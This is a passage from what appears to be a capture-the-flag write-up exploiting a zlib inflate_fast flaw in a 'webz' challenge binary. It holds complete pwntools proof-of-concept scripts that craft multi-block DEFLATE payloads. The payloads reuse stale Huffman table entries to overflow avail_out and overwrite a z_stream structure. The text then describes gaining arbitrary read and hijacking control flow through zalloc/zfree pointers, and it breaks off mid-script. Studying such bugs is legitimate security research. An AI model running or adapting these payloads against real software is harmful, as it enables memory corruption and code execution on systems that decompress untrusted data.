        }&lt;/code&gt;&lt;p&gt;In the literal path, a &lt;code&gt;code&lt;/code&gt; with &lt;code&gt;op=0, bits=0, val=0&lt;/code&gt; consumes zero bits and decodes a null byte. Since no bits are consumed, &lt;code&gt;inflate_fast&lt;/code&gt; would loop forever decoding that same entry.&lt;/p&gt;&lt;code&gt;    } while (in &amp;lt; last &amp;amp;&amp;amp; out &amp;lt; end);&lt;/code&gt;&lt;p&gt;However, the loop is bounded by &lt;code&gt;out &amp;lt; end&lt;/code&gt;, so no overflow occurs here.&lt;/p&gt;&lt;code&gt;      dolen:
        op = (unsigned)(here-&amp;gt;bits);
        hold &amp;gt;&amp;gt;= op;
        bits -= op;
        ...
        else if (op &amp;amp; 16) {                     /* length base */
            len = (unsigned)(here-&amp;gt;val);
            op &amp;amp;= 15;                           /* number of extra bits */
            if (op) {
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                }
                len += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
            }
            ...
        else if ((op &amp;amp; 64) == 0) {              /* 2nd level length code */
            here = lcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
            goto dolen;
        }&lt;/code&gt;&lt;p&gt;What about the length path? Because of the &lt;code&gt;op&lt;/code&gt; checks, the code falls into the second-level table lookup. With zero bits consumed, it indexes the 0th entry again.&lt;/p&gt;&lt;code&gt;          dodist:
            op = (unsigned)(here-&amp;gt;bits);
            hold &amp;gt;&amp;gt;= op;
            bits -= op;
            op = (unsigned)(here-&amp;gt;op);
            if (op &amp;amp; 16) {                      /* distance base */
                dist = (unsigned)(here-&amp;gt;val);
                op &amp;amp;= 15;                       /* number of extra bits */
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                    if (bits &amp;lt; op) {
                        hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                        bits += 8;
                    }
                }
            ....
            else if ((op &amp;amp; 64) == 0) {          /* 2nd level distance code */
                here = dcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
                goto dodist;
            }&lt;/code&gt;&lt;p&gt;Distance decoding behaves similarly, but worse: the second-level lookup jumps back into the distance decode path. The “0th table entry” behavior is dangerous, because the second-level lookup is designed to read a sub-table (with smaller &lt;code&gt;bits&lt;/code&gt;), but instead it’s indexing the primary table. &lt;code&gt;inflate_fast&lt;/code&gt; keeps at least 16 bits in &lt;code&gt;hold&lt;/code&gt; and assumes no codes exceed 15 bits, so it omits checks. The erroneous “0th entry” lookup breaks this assumption.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Why are Huffman codes guaranteed ≤15 bits? Because the Code Huffman table itself can only encode lengths up to 15; longer lengths cannot be represented.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Consider:&lt;/p&gt;&lt;code&gt;Bit buffer size: 16 (minimum present)
Primary table root: 10
Maximum Huffman code length: 12

1. Normal second-level distance lookup -&amp;gt; uninitialized entry `op=0, bits=0, val=0` (bits: 16 - 10 = 6)
2. Abnormal second-level lookup -&amp;gt; 0th primary-table entry (bits: 6 - 0 = 6)
3. Decoding the 0th primary-table entry (bits: 6 - 10 = -2)&lt;/code&gt;&lt;p&gt;As noted, the distance path jumps back into distance decoding after the second-level lookup, so the primary table (not sub-table) is indexed next, consuming too many bits. Ultimately, the &lt;code&gt;bits&lt;/code&gt; counter underflows—an integer overflow.&lt;/p&gt;&lt;code&gt;    /* return unused bytes (on entry, bits &amp;lt; 8, so in won't go too far back) */
    len = bits &amp;gt;&amp;gt; 3;
    in -= len;
    bits -= len &amp;lt;&amp;lt; 3;
    hold &amp;amp;= (1U &amp;lt;&amp;lt; bits) - 1;

    /* update state and return */
    strm-&amp;gt;next_in = in;
    strm-&amp;gt;next_out = out;
    strm-&amp;gt;avail_in = (unsigned)(in &amp;lt; last ? 5 + (last - in) : 5 - (in - last));
    strm-&amp;gt;avail_out = (unsigned)(out &amp;lt; end ?
                                 257 + (end - out) : 257 - (out - end));
    state-&amp;gt;hold = hold;
    state-&amp;gt;bits = bits;
    return;&lt;/code&gt;&lt;p&gt;At the end of &lt;code&gt;inflate_fast&lt;/code&gt;, the code adjusts &lt;code&gt;in&lt;/code&gt;/&lt;code&gt;avail_in&lt;/code&gt; by the number of unused bits. Thus, the integer overflow in &lt;code&gt;bits&lt;/code&gt; corrupts &lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt; and &lt;code&gt;strm-&amp;gt;avail_in&lt;/code&gt;, affecting subsequent decoding.&lt;/p&gt;&lt;code&gt;import struct

class BitStream:
    """LSB-first bit stream writer."""
    def __init__(self):
        self.bits = 0
        self.bit_count = 0
        self.data = bytearray()

    def write_bits(self, value, num_bits):
        for i in range(num_bits):
            bit = (value &amp;gt;&amp;gt; i) &amp;amp; 1
            if bit:
                self.bits |= (1 &amp;lt;&amp;lt; self.bit_count)
            self.bit_count += 1
            if self.bit_count == 8:
                self.data.append(self.bits)
                self.bits = 0
                self.bit_count = 0

    def get_bytes(self):
        if self.bit_count &amp;gt; 0:
            self.data.append(self.bits)
        return self.data

def generate_huffman_codes_from_lengths(lengths):
    max_len = 0
    for length in lengths:
        if length &amp;gt; max_len:
            max_len = length
    
    if max_len == 0:
        return {}

    bl_count = [0] * (max_len + 1)
    for length in lengths:
        if length &amp;gt; 0:
            bl_count[length] += 1
    
    code = 0
    next_code = [0] * (max_len + 1)
    for bits_len in range(1, max_len + 1):
        code = (code + bl_count[bits_len - 1]) &amp;lt;&amp;lt; 1
        next_code[bits_len] = code

    huffman_codes = {}
    for i, length in enumerate(lengths):
        if length != 0:
            rev_code = int(f'{next_code[length]:0{length}b}'[::-1], 2)
            huffman_codes[i] = (rev_code, length)
            next_code[length] += 1
    
    return huffman_codes

lbase = [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258]
lext = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0]
dbase = [1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577]
dext = [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13]
order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

def find_len_sym(length):
    for i in range(len(lbase)):
        if lbase[i] &amp;gt; length:
            i -= 1
            break
    base_len = lbase[i]
    extra_bits = lext[i]
    extra_val = length - base_len
    return 257 + i, extra_bits, extra_val

def find_dist_sym(distance):
    for i in range(len(dbase)):
        if dbase[i] &amp;gt; distance:
            i -= 1
            break
    base_dist = dbase[i]
    extra_bits = dext[i]
    extra_val = distance - base_dist
    return i, extra_bits, extra_val

def encode_lengths_rle(lengths):
    encoded = []
    i = 0
    while i &amp;lt; len(lengths):
        current_len = lengths[i]
        
        if current_len == 0:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == 0 and count &amp;lt; 138:
                count += 1
            if count &amp;gt;= 11:
                encoded.append((18, count - 11))
                i += count
                continue
            if count &amp;gt;= 3:
                encoded.append((17, count - 3))
                i += count
                continue

        if i &amp;gt; 0 and current_len == lengths[i - 1]:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == current_len and count &amp;lt; 6:
                count += 1
            if count &amp;gt;= 3:
                encoded.append((16, count - 3))
                i += count
                continue

        encoded.append((current_len, None))
        i += 1
    return encoded

def create_dynamic_deflate_payload(stream, is_last, symbol_stream, ll_lengths, dist_lengths):
    
    nlen = max(i for i, length in enumerate(ll_lengths) if length &amp;gt; 0) + 1
    ndist = max(i for i, length in enumerate(dist_lengths) if length &amp;gt; 0) + 1
    
    all_lengths = ll_lengths[:nlen] + dist_lengths[:ndist]
    rle_encoded_lengths = encode_lengths_rle(all_lengths)
    
    rle_symbols = [item[0] for item in rle_encoded_lengths]
    code_symbol_freqs = {sym: rle_symbols.count(sym) for sym in set(rle_symbols)}
    
    code_table_lengths = [0] * 19
    for sym in code_symbol_freqs:
        code_table_lengths[sym] = 7
    
    ncode = max(i for i, length in enumerate(order) if code_table_lengths[length] &amp;gt; 0) + 1

    code_huffman_table = generate_huffman_codes_from_lengths(code_table_lengths)

    stream.write_bits(is_last, 1) # BFINAL
    stream.write_bits(2, 2) # BTYPE (10 for dynamic)

    stream.write_bits(nlen - 257, 5)
    stream.write_bits(ndist - 1, 5)
    stream.write_bits(ncode - 4, 4)

    for i in range(ncode):
        stream.write_bits(code_table_lengths[order[i]], 3)
        
    for sym, extra_val in rle_encoded_lengths:
        code, length = code_huffman_table[sym]
        stream.write_bits(code, length)
        if sym == 16: stream.write_bits(extra_val, 2)
        elif sym == 17: stream.write_bits(extra_val, 3)
        elif sym == 18: stream.write_bits(extra_val, 7)


    ll_huffman_table = generate_huffman_codes_from_lengths(ll_lengths)
    dist_huffman_table = generate_huffman_codes_from_lengths(dist_lengths)
    
    for type, val in symbol_stream:
        if type == 'LIT':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'EOB':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'LD':
            l, d = val
            len_sym, len_extra_bits, len_extra_val = find_len_sym(l)
            dist_sym, dist_extra_bits, dist_extra_val = find_dist_sym(d)
            
            code, length = ll_huffman_table[len_sym]
            stream.write_bits(code, length)
            if len_extra_bits &amp;gt; 0:
                stream.write_bits(len_extra_val, len_extra_bits)
            
            code, length = dist_huffman_table[dist_sym]
            stream.write_bits(code, length)
            if dist_extra_bits &amp;gt; 0:
                stream.write_bits(dist_extra_val, dist_extra_bits)
        elif type == 'INVALID':
            code, length = val
            stream.write_bits(code, length)


stream = BitStream()

# "AABCABC" -&amp;gt; 'A', 'A', 'B', 'C', (L=3, D=3), EOB
symbol_stream = [
    ('LIT', 65), ('LIT', 65), ('LIT', 66), ('LIT', 67),
    ('LD', (3, 3))
]

symbol_stream.append(("INVALID", (int('000000000000110'[::-1],2),15)))
symbol_stream.append(("INVALID", (int('000000001001'[::-1],2),12)))

symbol_stream.append(('EOB', 256))

for i in range(0,0x200):
    symbol_stream.append(('LIT', 65))

ll_lengths = [0] * 286
ll_lengths[65] = 15  # 'A'
ll_lengths[66] = 15  # 'B'
ll_lengths[67] = 15  # 'C'
ll_lengths[68] = 15  # 'D'
ll_lengths[69] = 15  # 'E'
ll_lengths[256] = 15 # EOB
ll_lengths[257] = 15 # Length 3

dist_lengths = [0] * 30
dist_lengths[2] = 10 # Distance 3
dist_lengths[3] = 10 # Distance 4
dist_lengths[4] = 12 # Distance 5

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
payload = stream.get_bytes()

print(f"Generated DEFLATE payload ({len(payload)} bytes):")
print(payload.hex())

from pwn import *

p = process("./src/webz_asan")

def send_webz_payload(pay):
    MAX_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(52) # MAX = 52, 52
    p.send(p32(len(pay)+12))
    p.send(b"WEBZ"+MAX_AROUND_WIDTH_HEIGHT+b"\x00\x00\x00\x00"+pay)

send_webz_payload(payload)

p.interactive()&lt;/code&gt;&lt;p&gt;We reproduce the case described above. The Distance table has &lt;code&gt;root=10&lt;/code&gt; with a maximum code length of 12, so there are unfilled entries with &lt;code&gt;op=0, bits=0, val=0&lt;/code&gt;. By crafting the stream to force a multilevel lookup, we can trigger the vulnerability.&lt;/p&gt;&lt;code&gt;    symbol_stream.append(("INVALID", (int('000000000000110'[::-1],2),15)))
    symbol_stream.append(("INVALID", (int('000000001001'[::-1],2),12)))&lt;/code&gt;&lt;p&gt;These are key. The first is a valid 15‑bit length code. The second is an invalid 12‑bit distance code.&lt;/p&gt;&lt;code&gt;dist_lengths[4] = 12 # Distance 5&lt;/code&gt;&lt;p&gt;The valid distance‑5 code is &lt;code&gt;000000001000&lt;/code&gt;. Instead, &lt;code&gt;000000001001&lt;/code&gt; forces a second‑level lookup that reads an uninitialized &lt;code&gt;code&lt;/code&gt; entry.&lt;/p&gt;&lt;p&gt;As a result, &lt;code&gt;next_in&lt;/code&gt;/&lt;code&gt;avail_in&lt;/code&gt; are corrupted.&lt;/p&gt;&lt;p&gt;However, this particular memory corruption was not exploitable. If we first decompress dummy data in block one, and then in a second block trigger the bug with a Literal/Length table that only contains EOB, we can corrupt &lt;code&gt;next_in&lt;/code&gt;/&lt;code&gt;avail_in&lt;/code&gt; without crashing. But since these are input stream variables (not output buffer variables), we couldn’t achieve an overflow or OOB write on the decompressed output buffer.&lt;/p&gt;&lt;p&gt;So what should we target to exploit uninitialized table entries? The most promising avenue in zlib is to abuse the copy routines. The stored-block copy and the LZ77 copy are powerful overwrite primitives—if we can disable the checks that constrain them.&lt;/p&gt;&lt;p&gt;In other words, we need to corrupt &lt;code&gt;avail_out&lt;/code&gt;, not &lt;code&gt;avail_in&lt;/code&gt;. Let’s inspect &lt;code&gt;inflate_fast&lt;/code&gt;’s LZ77 decode.&lt;/p&gt;&lt;code&gt;        else if (op &amp;amp; 16) {                     /* length base */
            len = (unsigned)(here-&amp;gt;val);
            op &amp;amp;= 15;                           /* number of extra bits */
            if (op) {
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                }
                len += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
            }
            Tracevv((stderr, "inflate:         length %u\n", len));
            if (bits &amp;lt; 15) {
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
            }
            here = dcode + (hold &amp;amp; dmask);
          dodist:
            op = (unsigned)(here-&amp;gt;bits);
            hold &amp;gt;&amp;gt;= op;
            bits -= op;
            op = (unsigned)(here-&amp;gt;op);
            if (op &amp;amp; 16) {                      /* distance base */
                dist = (unsigned)(here-&amp;gt;val);
                op &amp;amp;= 15;                       /* number of extra bits */
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                    if (bits &amp;lt; op) {
                        hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                        bits += 8;
                    }
                }
                dist += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
#ifdef INFLATE_STRICT
                if (dist &amp;gt; dmax) {
                    strm-&amp;gt;msg = (z_const char *)"invalid distance too far back";
                    state-&amp;gt;mode = BAD;
                    break;
                }
#endif
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
                Tracevv((stderr, "inflate:         distance %u\n", dist));&lt;/code&gt;&lt;p&gt;The LZ77 decode in &lt;code&gt;inflate_fast&lt;/code&gt; has almost no checks. The only guard is &lt;code&gt;if (dist &amp;gt; dmax)&lt;/code&gt;, behind &lt;code&gt;INFLATE_STRICT&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;How can it still be safe?&lt;/p&gt;&lt;code&gt;    static const unsigned short lbase[31] = { /* Length codes 257..285 base */
        3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,
        35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};
    static const unsigned short lext[31] = { /* Length codes 257..285 extra */
        16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,
        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 73, 200};&lt;/code&gt;&lt;p&gt;The maximum copy length (LZ77 length) is &lt;code&gt;lbase[28] (258) + ((lext[28] (16) &amp;amp; 15) == 0)&lt;/code&gt; → 258. Earlier we noted that &lt;code&gt;inflate_fast&lt;/code&gt; is entered only when &lt;code&gt;strm-&amp;gt;avail_out &amp;gt;= 258&lt;/code&gt;, and the loop exits as soon as that’s no longer true. Thus, &lt;code&gt;inflate_fast&lt;/code&gt; can safely omit length checks because it guarantees there are at least 258 bytes of space.&lt;/p&gt;&lt;code&gt;            state-&amp;gt;next = state-&amp;gt;codes;
            state-&amp;gt;lencode = state-&amp;gt;distcode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;lenbits = 7;
            ret = inflate_table(CODES, state-&amp;gt;lens, 19, &amp;amp;(state-&amp;gt;next),
                                &amp;amp;(state-&amp;gt;lenbits), state-&amp;gt;work);&lt;/code&gt;&lt;p&gt;In &lt;code&gt;inflate&lt;/code&gt;, tables are written into &lt;code&gt;state-&amp;gt;codes&lt;/code&gt;, which is not cleared between blocks. The tables’ boundaries aren’t fixed either; &lt;code&gt;state-&amp;gt;next&lt;/code&gt; advances dynamically, so different blocks can lay out different tables at different offsets.&lt;/p&gt;&lt;p&gt;Therefore, stale entries from a previous block can persist in uninitialized slots of later tables—even of different types.&lt;/p&gt;&lt;p&gt;If a Distance-table entry from a previous block remains in an uninitialized slot of the subsequent Literal/Length table, we’re in trouble. Deflate limits lengths to 258, but distances can be much larger. If a stale Distance entry is misinterpreted as a Length entry in &lt;code&gt;inflate_fast&lt;/code&gt;, its length can exceed 258, breaking the invariant that made &lt;code&gt;inflate_fast&lt;/code&gt; safe.&lt;/p&gt;&lt;code&gt;    strm-&amp;gt;avail_out = (unsigned)(out &amp;lt; end ?
                                 257 + (end - out) : 257 - (out - end));&lt;/code&gt;&lt;p&gt;Ultimately, when the LZ77 decode interprets a stale Distance entry as a Length, &lt;code&gt;strm-&amp;gt;avail_out&lt;/code&gt; suffers an integer overflow. Unlike &lt;code&gt;avail_in&lt;/code&gt;, &lt;code&gt;avail_out&lt;/code&gt; reflects the remaining size of the output buffer, so this immediately leads to a buffer overflow.&lt;/p&gt;&lt;code&gt;#define MAX_INPUT_SIZE 4096
#define MAX_OUTPUT_SIZE (MAX_INPUT_SIZE * 2)

typedef struct EncodedWebz {
    uint8_t data[MAX_INPUT_SIZE];
    size_t size;
} EncodedWebz;

typedef struct DecodedWebz {
    uint8_t data[MAX_OUTPUT_SIZE];
    size_t size;
} DecodedWebz;

typedef struct WebzState {
    EncodedWebz encoded;
    DecodedWebz decoded;
    z_stream infstream;
    char ok_status[5];
} WebzState;

WebzState webz_state;&lt;/code&gt;&lt;p&gt;The decompressed bytes are written into the global &lt;code&gt;webz_state&lt;/code&gt; in &lt;code&gt;webz.c&lt;/code&gt;. To actually corrupt memory, we must write more than &lt;code&gt;8192&lt;/code&gt; bytes and overflow into the following &lt;code&gt;z_stream infstream&lt;/code&gt;, overwriting its fields.&lt;/p&gt;&lt;code&gt;stream = BitStream()

# STORED BLOCK ===============================================================================
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x200
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('X'), 8)
# STORED BLOCK ===============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = [ ('EOB', 256) ]

ll_lengths = [0] * 286
ll_lengths[256] = 3 # EOB

dist_lengths = [0] * 30
for i in range(17,30):
    dist_lengths[i] = 15

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = []

symbol_stream.append(("INVALID", (8,10)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(("INVALID", (int('000'[::-1],2),3)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(('EOB', 256))
ll_lengths = [0] * 286
ll_lengths[256] = 10 # EOB
ll_lengths[257] = 10 # Length 3
ll_lengths[258] = 12 # Length 4

dist_lengths = [0] * 30
dist_lengths[17] = 3 # Distance ???

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================

# STORED BLOCK ===============================================================================
stream.write_bits(0, 5) # dummy
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x10
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('C'), 8)
# STORED BLOCK ===============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = []
symbol_stream.append(('LIT', 65))
for i in range(0,0x2ce):
    symbol_stream.append(('LD', (10, 1)))
for i in range(0,7):
    symbol_stream.append(('LIT', 65))
symbol_stream.append(('EOB', 256))

ll_lengths = [0] * 286
ll_lengths[65] = 3  # 'A'
ll_lengths[256] = 3 # EOB
ll_lengths[264] = 3 # Length 10

dist_lengths = [0] * 30
dist_lengths[0] = 3 # Distance 1


create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================

# STORED BLOCK ===============================================================================
overwrriten_infstream = b'X'*0x60

stream.write_bits(1, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = len(overwrriten_infstream)
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(overwrriten_infstream[i], 8)
# STORED BLOCK =============================================================================

"""
0x000064f4b0253370│+0x0000: 0x000064f4b02507de  →  0x0000000000000000
0x000064f4b0253378│+0x0008: 0x0000000000000000
0x000064f4b0253380│+0x0010: 0x0000000000000472
0x000064f4b0253388│+0x0018: 0x000064f4b0253370  →  0x000064f4b02507de  →  0x0000000000000000
0x000064f4b0253390│+0x0020: 0x00000000ffffe304  →  0x0000000000000000
0x000064f4b0253398│+0x0028: 0x0000000000002008
0x000064f4b02533a0│+0x0030: 0x000064f4b02533e0  →  0x0000000000000000
0x000064f4b02533a8│+0x0038: 0x0000000000000000
0x000064f4b02533b0│+0x0040: 0x000064f4af885820  →  &amp;lt;webz_alloc+0000&amp;gt; push rbp
0x000064f4b02533b8│+0x0048: 0x000064f4af8a3390  →  &amp;lt;zcfree+0000&amp;gt; push rbp
0x000064f4b02533c0│+0x0050: 0x0000000000000000
0x000064f4b02533c8│+0x0058: 0x0000000000000040 ("@"?)
"""

payload = stream.get_bytes()
print(f"Generated DEFLATE payload ({len(payload)} bytes):")

p = process("./webz")
#p = process("./src/webz_asan")

def send_webz_payload(pay):
    #MAX_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(52) # MAX = 52, 52
    NORMAL_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(5)
    p.send(p32(len(pay)+12))
    p.send(b"WEBZ"+NORMAL_AROUND_WIDTH_HEIGHT+b"\x00\x00\x00\x00"+pay)

raw_input()
send_webz_payload(payload)

p.interactive()&lt;/code&gt;&lt;p&gt;The PoC uses six blocks. Let’s walk through them.&lt;/p&gt;&lt;code&gt;# STORED BLOCK ===============================================================================
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x200
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('X'), 8)
# STORED BLOCK ===============================================================================&lt;/code&gt;&lt;p&gt;Block 1: writes dummy bytes to the output buffer so that later copies with large distances won’t misbehave.&lt;/p&gt;&lt;code&gt;# DYNAMIC BLOCK ==============================================================================
symbol_stream = [ ('EOB', 256) ]

ll_lengths = [0] * 286
ll_lengths[256] = 3 # EOB

dist_lengths = [0] * 30
for i in range(17,30):
    dist_lengths[i] = 15

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================&lt;/code&gt;&lt;p&gt;Block 2: prepares the ground for the bug by filling the table area with Distance symbols. Those entries will persist in uninitialized slots later.&lt;/p&gt;&lt;code&gt;# DYNAMIC BLOCK ==============================================================================
symbol_stream = []

symbol_stream.append(("INVALID", (8,10)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(("INVALID", (int('000'[::-1],2),3)))
symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
symbol_stream.append(('EOB', 256))
ll_lengths = [0] * 286
ll_lengths[256] = 10 # EOB
ll_lengths[257] = 10 # Length 3
ll_lengths[258] = 12 # Length 4

dist_lengths = [0] * 30
dist_lengths[17] = 3 # Distance ???

create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================&lt;/code&gt;&lt;p&gt;Block 3: creates an incomplete Huffman table and references the uninitialized entry to perform LZ77 decoding. This actually triggers the bug and causes integer overflow in &lt;code&gt;avail_out&lt;/code&gt;. From this point on, boundary checks for the decompression buffer malfunction, enabling buffer overflow.&lt;/p&gt;&lt;code&gt;# STORED BLOCK ===============================================================================
stream.write_bits(0, 5) # dummy
stream.write_bits(0, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = 0x10
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(ord('C'), 8)
# STORED BLOCK ===============================================================================

# DYNAMIC BLOCK ==============================================================================
symbol_stream = []
symbol_stream.append(('LIT', 65))
for i in range(0,0x2ce):
    symbol_stream.append(('LD', (10, 1)))
for i in range(0,7):
    symbol_stream.append(('LIT', 65))
symbol_stream.append(('EOB', 256))

ll_lengths = [0] * 286
ll_lengths[65] = 3  # 'A'
ll_lengths[256] = 3 # EOB
ll_lengths[264] = 3 # Length 10

dist_lengths = [0] * 30
dist_lengths[0] = 3 # Distance 1


create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
# DYNAMIC BLOCK ==============================================================================&lt;/code&gt;&lt;p&gt;As noted, to overwrite &lt;code&gt;z_stream infstream&lt;/code&gt;, we must first fill the 8192‑byte output buffer. We use LZ77 and a stored block to push ~8120 bytes of padding.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Due to padding/alignment within&lt;/p&gt;&lt;code&gt;WebzState&lt;/code&gt;, we need 8120 bytes (not 8192) to reach just before&lt;code&gt;z_stream infstream&lt;/code&gt;. Also, because the decompression buffer is larger than the compressed input limit, we use LZ77 to generate many output bytes from little input.&lt;/quote&gt;&lt;code&gt;# STORED BLOCK ===============================================================================
overwrriten_infstream = b'X'*0x60

stream.write_bits(1, 1) # BFINAL
stream.write_bits(0, 2) # BTYPE (0 for stored)
stream.bytebits()
stored_block_length = len(overwrriten_infstream)
stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
for i in range(0, stored_block_length):
    stream.write_bits(overwrriten_infstream[i], 8)
# STORED BLOCK =============================================================================&lt;/code&gt;&lt;p&gt;The final block performs the actual overflow to overwrite &lt;code&gt;z_stream infstream&lt;/code&gt;, letting us set its members arbitrarily.&lt;/p&gt;&lt;p&gt;Running the PoC confirms &lt;code&gt;z_stream infstream&lt;/code&gt; is overwritten.&lt;/p&gt;&lt;p&gt;The exploit is straightforward.&lt;/p&gt;&lt;code&gt;printf("Read receipt: %s\n", webz_state.infstream.msg);&lt;/code&gt;&lt;p&gt;First, by partially overwriting the &lt;code&gt;msg&lt;/code&gt; pointer in &lt;code&gt;infstream&lt;/code&gt; or setting it arbitrarily, we get arbitrary read.&lt;/p&gt;&lt;code&gt;local int updatewindow(z_streamp strm, const Bytef *end, unsigned copy) {
    struct inflate_state FAR *state;
    unsigned dist;

    state = (struct inflate_state FAR *)strm-&amp;gt;state;

    /* if it hasn't been done already, allocate space for the window */
    if (state-&amp;gt;window == Z_NULL) {
        state-&amp;gt;window = (unsigned char FAR *)
                        ZALLOC(strm, 1U &amp;lt;&amp;lt; state-&amp;gt;wbits,
                               sizeof(unsigned char));
        if (state-&amp;gt;window == Z_NULL) return 1;
    }
...&lt;/code&gt;&lt;code&gt;int ZEXPORT inflateEnd(z_streamp strm) {
    struct inflate_state FAR *state;
    if (inflateStateCheck(strm))
        return Z_STREAM_ERROR;
    state = (struct inflate_state FAR *)strm-&amp;gt;state;
    if (state-&amp;gt;window != Z_NULL) ZFREE(strm, state-&amp;gt;window);
    ZFREE(strm, strm-&amp;gt;state);
    strm-&amp;gt;state = Z_NULL;
    Tracev((stderr, "inflate: end\n"));
    return Z_OK;
}&lt;/code&gt;&lt;p&gt;Additionally, since &lt;code&gt;updatewindow&lt;/code&gt; and &lt;code&gt;inflateEnd&lt;/code&gt; call &lt;code&gt;zalloc&lt;/code&gt;/&lt;code&gt;zfree&lt;/code&gt;, control‑flow hijacking is easy.&lt;/p&gt;&lt;code&gt;import struct
from pwn import *

class BitStream:
    """LSB-first bit stream writer."""
    def __init__(self):
        self.bits = 0
        self.bit_count = 0
        self.data = bytearray()

    def write_bits(self, value, num_bits):
        for i in range(num_bits):
